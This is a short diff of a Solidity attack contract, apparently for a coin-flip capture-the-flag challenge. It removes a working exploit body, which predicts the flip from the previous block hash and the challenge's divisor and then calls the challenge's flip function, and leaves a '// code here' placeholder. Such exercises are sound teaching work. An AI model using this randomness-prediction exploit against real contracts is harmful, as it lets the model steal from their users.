@@ -13,13 +13,7 @@ contract CoinFlipHack {
     }
 
     function attack() external payable {
-        // simulate the same what the challenge contract does
-        uint256 blockValue = uint256(blockhash(block.number - 1));
-        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-        bool side = coinFlip == 1 ? true : false;
-
-        // call challenge contract with same guess
-        challenge.flip(side);
+        // code here
     }
 
     fallback() external payable {}
